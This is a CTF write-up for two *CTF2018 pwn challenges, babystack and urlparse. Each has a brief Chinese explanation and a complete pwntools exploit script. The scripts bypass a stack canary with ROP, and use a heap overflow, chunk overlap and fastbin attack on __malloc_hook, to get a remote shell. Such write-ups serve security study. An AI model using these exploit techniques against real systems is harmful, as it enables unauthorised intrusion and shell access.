# *CTF2018
[TOC] 

##babystack 

线程thread的canary 储存在线程栈上，能够被溢出覆盖，既可以顺利bypass canary
通过stack pivot 做ROP getshell 即可


```

	python
	#/usr/env/bin python
	from pwn import *
	import sys
	
	def proof(recvive,result):
	    guess = string.letters+string.digits
	
	    for i1 in guess:
	        for i2 in guess:
	            for i3 in guess:
	                for i4 in guess:
	                    if hashlib.sha256(i1+i2+i3+i4+recvive).hexdigest()==result:
	                        return i1+i2+i3+i4
	def exploit(flag):
	    enter_str = ""
	    io.recvuntil('sha256(xxxx+')
	    recvive = io.recv(16)
	    io.recvuntil(') == ')
	    result = io.recv(64)
	    log.info('running...')
	    log.info("recvice:"+recvive)
	    log.info('result:'+result)
	    enter_str = proof(str(recvive),str(result))
	    log.info('enter_str:'+enter_str)
	    io.recvuntil('Give me xxxx:\n')
	    
		io.sendline(enter_str)
		io.recvuntil('How many bytes do you want to send?\n')
	    io.sendline(str(0x17f0))
	    payload = '\x00'*0x1018
	    payload += p64(0x400c03)
	    payload += p64(elf.got['puts'])
	    payload += p64(elf.plt['puts'])
	    payload += p64(0x400BFA)
	    payload += p64(0)
	    payload += p64(1)
	    payload += p64(elf.got['read'])
	    payload += p64(0x100)
	    payload += p64(0x602038)
	    payload += p64(0)
	    payload += p64(0x400BE0)
	    payload += 7*p64(0)
	    payload += p64(0x400870)
	    payload += p64(0x602030)
	    payload += p64(0x400b90)
	    payload += p64(0x602030)
	    payload = payload.ljust(0x17f0,'\x00')
	    io.send(payload)
	
	    io.recvuntil('It\'s time to say goodbye.\n')
	    sleep(0.2)
	    puts_addr = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
	    log.info('puts_addr:'+hex(puts_addr))
	    libc.address = puts_addr-libc.symbols['puts']
	    system = libc.symbols['system']
	    log.info('system:'+hex(system))
	    binsh_addr = next(libc.search('/bin/sh'))
	    log.info('binsh_addr:'+hex(binsh_addr))
	
	    raw_input('Go')
	    rop = p64(libc.address+0xf1147)
	    io.send(rop)
	
	    io.interactive()
	
	if __name__ == "__main__":
	    context.binary = "./bs" 
	    context.terminal = ['tmux','sp','-h']
	    #context.log_level = 'debug'
	    elf = ELF('./bs')
	    if len(sys.argv)>1:
	        io = remote(sys.argv[1],sys.argv[2])
	        libc=ELF('./libc.so.6')
	        exploit(0)
	    else:
	        io = process('./bs')
	        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	        exploit(1)

```




##urlparse
程序实现了简单的url encode和decode 解析器
漏洞是一个decode padding，能够构造类似*"%\x00"*在decode后将"\x00"消除从而造成`heap overflow`

通过*heap overflow*可以*extend chunk* 从而实现*chunk overlap*。
首先泄露libc和heap地址
之后通过*chunk overlap* 构造的*use after free* 的 *fastbin attack* 修改`__malloc_hook` 为`one_gadget` 即可

注意写入时候，为了保证内容正确可以double urlencode 输入，从而decode两次保证内容正确。


```
	
	python
	#/usr/env/bin python
	#-*- coding: utf-8 -*- 
	
	from pwn import *
	import urllib
	import sys
	
	def create(Size,Url):
	    io.sendlineafter('> ',str(1))
	    io.recvuntil('size: ')
	    io.sendline(str(Size))
	    io.recvuntil('URL: ')
	    if Size>0:
	        io.send(Url)
	    else:
	        pass
	
	def encode(Index):
	    io.sendlineafter('> ',str(2))
	    io.recvuntil('index: ')
	    io.sendline(str(Index))
	
	def decode(Index):
	    io.sendlineafter('> ',str(3))
	    io.recvuntil('index: ')
	    io.sendline(str(Index))
	
	def lists():
	    io.sendlineafter('> ',str(4))
	
	def delete(Index):
	    io.sendlineafter('> ',str(5))
	    io.recvuntil('index: ')
	    io.sendline(str(Index))
	
	def down():
	    io.sendlineafter('> ',str(6))
	
	def proof(recvive,result):
	    guess = string.letters+string.digits
	
	    for i1 in guess:
	        for i2 in guess:
	            for i3 in guess:
	                for i4 in guess:
	                    if hashlib.sha256(i1+i2+i3+i4+recvive).hexdigest()==result:
	                        return i1+i2+i3+i4
	
	def exploit(flag):
	    if flag==0:
	        enter_str = ""
	        io.recvuntil('sha256(xxxx+')
	        recvive = io.recv(16)
	        io.recvuntil(') == ')
	        result = io.recv(64)
	        log.info('running...')
	        log.info("recvice:"+recvive)
	        log.info('result:'+result)
	        enter_str = proof(str(recvive),str(result))
	        log.info('enter_str:'+enter_str)
	        io.recvuntil('Give me xxxx:\n')
	        io.sendline(enter_str)
	
	    #leaking heap address
	    create(0x400,'0'*0x3ff)
	    create(0x400,'1'*0x3ff)
	    create(0x400,'2'*0x3ff)
	    delete(1)
	    create(0x8,'AAAAAA%')
	    lists()
	    io.recvuntil('0: ')
	    io.recvuntil('AAAAAA22')
	    heap_base =u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x410
	    log.info('heap_base:'+hex(heap_base))
	
	    #leaking libc address
	    create(0x0,'')
	    lists()
	    io.recvuntil('0: ')
	    if flag==1:
	        #larger bin
	        libc.address =u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c4b78
	        one_gadget = libc.address+0xf1147
	    else:
	        libc.address =u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c4b78
	        one_gadget = libc.address+0xf1147
	    log.info('one_gadget:'+hex(one_gadget))
	    __malloc_hook = libc.symbols['__malloc_hook']
	    log.info('__malloc_hook:'+hex(__malloc_hook))
	    system = libc.symbols['system']
	    log.info('system:'+hex(system))
	
	    create(0x3b8,'padding\n')
	
	    #overlap
	    create(0x90, 'z' * 0x8f)
	    create(0x20, 'p' * 0x1e+'%')
	    create(0x2420,'2\n')
	    create(0x60,'y'*0x5f)
	    create(0x90,'x'*0x78+'\x30%25\x00\x00\x00\x00'+'\n')
	    delete(2)
	
	    encode(2)
	
	    delete(1)
	    for i in range(17):
	        create(0x210,'\x00\n')
	    #gdb.attach(io,'b *'+hex(proc_base+0x1037))
	    #double quote
	    create(0x80,urllib.quote(urllib.quote(p64(0x70)+p64(__malloc_hook-0x23)))+'\n')
	    decode(0)
	    create(0x58,"AAAAAAAA\n")
	    create(0x58,'A'*0xb+p64(one_gadget)+'\n')
	
	    io.sendlineafter('> ',str(1))
	    io.recvuntil('size: ')
	    io.sendline(str(1))
	
	    io.interactive()
	
	if __name__ == "__main__":
	    context.binary = "./urlparse"
	    context.terminal = ['tmux','sp','-h','-l','110']
	    #context.log_level = 'debug'
	    elf = ELF('./urlparse')
	    if len(sys.argv)>1:
	        io = remote(sys.argv[1],sys.argv[2])
	        libc = elf.libc
	        exploit(0)
	    else:
	        io = process('./urlparse')
	        libc = elf.libc
	        print io.libs()
	        libc_base = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
	        log.info('libc_base:'+hex(libc_base))
	        proc_base = io.libs()['/mnt/hgfs/Binary/CTF/2018/*ctf/urlparse/workspace/urlparse']
	        log.info('proc_base:'+hex(proc_base))
	        exploit(1)

```
![-w500](media/15244669671953/15244676493560.jpg)


